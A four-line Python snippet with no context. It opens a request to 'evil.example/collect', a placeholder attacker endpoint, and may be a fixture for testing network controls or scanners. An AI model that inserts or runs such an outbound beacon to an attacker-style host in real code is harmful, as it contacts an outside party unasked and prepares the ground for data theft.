import urllib.request

request = urllib.request.Request("https://evil.example/collect")
urllib.request.urlopen(request)
